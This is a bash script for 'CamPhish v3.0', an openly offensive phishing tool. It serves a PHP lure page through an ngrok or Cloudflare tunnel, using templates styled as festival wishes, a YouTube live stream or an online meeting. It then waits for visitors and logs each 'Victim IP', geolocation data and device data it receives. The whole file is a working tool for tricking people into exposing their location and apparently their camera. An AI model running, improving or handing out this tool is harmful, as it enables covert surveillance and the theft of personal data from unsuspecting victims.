#!/bin/bash
# CamPhish v3.0 - Pro Edition
# Refactored for Absolute Reliability
# Original by TechChip | Enhanced by Antigravity

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "[+] Windows system detected. Adapting commands..."
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill() { 
    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null; 
    else taskkill /F /IM "$1" 2>/dev/null; fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 3.0 [Pro Edition] \e[0m \n"
printf " \e[1;77m Optimized for Kali Linux & Cross-Platform Reliability \e[0m \n"
}

dependencies() {
printf "\e[1;92m[\e[0m*\e[1;92m] Checking dependencies...\e[0m\n"
for cmd in php curl wget unzip; do
  if ! command -v $cmd >/dev/null 2>&1; then
    printf "\e[1;31m[!] Error: $cmd is not installed. Please install it first.\e[0m\n"
    exit 1
  fi
done
printf "\e[1;92m[\e[0m+\e[1;92m] All dependencies found.\e[0m\n"
}

stop() {
printf "\n\e[1;93m[\e[0m!\e[1;93m] Cleaning up processes and exiting...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" /IM "php.exe" /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
  pkill -f "cloudflared tunnel" >/dev/null 2>&1
  pkill -f "ngrok http" >/dev/null 2>&1
  killall php ngrok cloudflared 2>/dev/null
fi
exit 0
}

catch_ip() {
  if [[ -f ip.txt ]]; then
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m+\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
    rm -rf ip.txt
  fi
}

catch_location() {
  if [[ -f "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Location Data Received!\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    mv current_location.txt "saved_locations/location_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null || rm current_location.txt
  fi
}

checkfound() {
mkdir -p saved_locations
printf "\n\e[1;92m[\e[0m*\e[1;92m] Waiting for targets... (Press Ctrl+C to exit)\e[0m\n"
while true; do
  if [[ -f "ip.txt" ]]; then catch_ip; fi
  if [[ -f "current_location.txt" ]]; then catch_location; fi
  if [[ -f "Log.log" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] Notification: Device data received!\e[0m\n"
    rm -rf Log.log
  fi
  sleep 1
done
}

cloudflare_tunnel() {
if [[ ! -f "cloudflared" ]] && [[ ! -f "cloudflared.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
    elif [[ "$arch" == "x86_64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    elif [[ "$arch" == *"arm"* ]] || [[ "$arch" == "aarch64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
    fi
    chmod +x cloudflared 2>/dev/null
    chmod +x cloudflared.exe 2>/dev/null
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\e[0m\n"
rm -rf .cloudflared.log && touch .cloudflared.log
if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Generating link (up to 60s)...\e[0m\n"
for i in {1..20}; do
    sleep 3
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log)
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Attempt $i/20...\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] Error: Link generation failed.\e[0m\n"
    printf "\e[1;93m[Dumping last 5 lines of .cloudflared.log for debugging:]\e[0m\n"
    tail -n 5 .cloudflared.log
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] Success! Direct Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
    payload_cloudflare "$link"
    checkfound
fi
}

payload_cloudflare() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

ngrok_server() {
if [[ ! -f "ngrok" ]] && [[ ! -f "ngrok.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
    elif [[ "$arch" == "x86_64" ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip
    fi
    unzip -q ngrok.zip && rm ngrok.zip
    chmod +x ngrok 2>/dev/null
    chmod +x ngrok.exe 2>/dev/null
fi

# Auth token handling (Simplified)
if [[ ! -f ~/.ngrok2/ngrok.yml ]] && [[ ! -f "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Ngrok Authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth >/dev/null 2>&1 || ./ngrok.exe authtoken $ngrok_auth >/dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then ./ngrok.exe http 3333 > /dev/null 2>&1 &
else ./ngrok http 3333 > /dev/null 2>&1 &; fi

printf "\e[1;92m[\e[0m+\e[1;92m] Generating link...\e[0m\n"
for i in {1..20}; do
    sleep 3
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Attempt $i/20...\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] Error: Ngrok link generation failed.\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m*\e[1;92m] Success! Direct Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
    payload_ngrok "$link"
    checkfound
fi
}

payload_ngrok() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

select_template() {
printf "\n----- Choose a Template -----\n"
printf "[01] Festival Wishing\n"
printf "[02] Live Youtube TV\n"
printf "[03] Online Meeting\n"
read -p $'\n[+] Choose: [Default 1] ' option_tem
option_tem="${option_tem:-1}"

if [[ $option_tem -eq 1 ]]; then
    read -p $'[+] Enter festival name: ' fest_name
elif [[ $option_tem -eq 2 ]]; then
    read -p $'[+] Enter YouTube video ID: ' yt_video_ID
fi
}

camphish() {
banner
dependencies
printf "\n----- Choose Tunnel Server -----\n"
printf "[01] Ngrok\n"
printf "[02] CloudFlare Tunnel\n"
read -p $'\n[+] Choose: [Default 1] ' option_server
option_server="${option_server:-1}"

select_template

if [[ "$option_server" == "2" ]]; then cloudflare_tunnel
else ngrok_server; fi
}

camphish
